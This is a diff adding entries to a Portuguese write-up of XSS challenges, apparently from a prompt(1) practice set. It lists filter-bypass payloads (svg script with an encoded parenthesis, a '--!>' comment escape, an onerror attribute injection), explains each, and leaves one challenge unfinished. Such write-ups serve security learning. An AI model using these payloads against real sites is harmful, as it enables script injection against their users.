@@ -41,5 +41,66 @@ HTML Source:
 </article>
 ```
 
-<article><svg/ onload=prompt(1)
-</article>
+#### Desafio 2:
+
+[![questao2.png](https://i.postimg.cc/13hHLVNK/questao2.png)](https://postimg.cc/zV7KhB7L)
+
+Input:
+```
+<svg><script>prompt&#40;1)</script>
+```
+Ainda lidando com filtragem, agora não podemos usar nem `=` nem `(`, ent para isso tem se conhecimento que todas as teclas de um teclado tem um código correspondente, no caso do `(` é `&#40`. Iniciamos nosso input abrindo a tag `<svg>`, concluimos colocando um script dentro dela `<script></script>` e chamando o prompt(1) dentro da tag script
+
+HTML Source:
+```
+<svg><script>prompt&#40;1)</script>
+```
+
+#### Desafio 3:
+
+[![questao3.png](https://i.postimg.cc/yx6bwggd/questao3.png)](https://postimg.cc/9RSb9fB5)
+
+Input:
+```
+--!><svg onload=prompt(1)
+```
+Nessa questão nosso input está sendo colocado dentro de `<!--...-->`, então tudo que escrevemos é visto pelo código como comentário, então precisamos encerrar a sessão de comentarios.
+Para isso é possível usar de 2 formas, `-->` e `--!>`, mas como temos a filtragem de `->` então temos de usar a segunda opção. 
+Então seguimos nosso input com um tipo `svg` em que ao ser carregado chama o `prompt(1)`
+
+HTML Source:
+```
+<!-- --!><svg onload=prompt(1) -->
+```
+
+#### Desafio 4:
+
+[![questao4.png](https://i.postimg.cc/nz5tYGwx/questao4.png)](https://postimg.cc/mzQqTCsp)
+
+Input:
+```
+
+```
+resolução
+
+HTML Source:
+```
+
+```
+
+#### Desafio 5:
+
+[![questao5.png](https://i.postimg.cc/R0kkWZ3C/questao5.png)](https://postimg.cc/GBj7NrJ6)
+
+Input:
+```
+"type=image src onerror
+="prompt(1)
+```
+
+
+HTML Source:
+```
+<input value=""type=image src onerror
+="prompt(1)" type="text">
+```
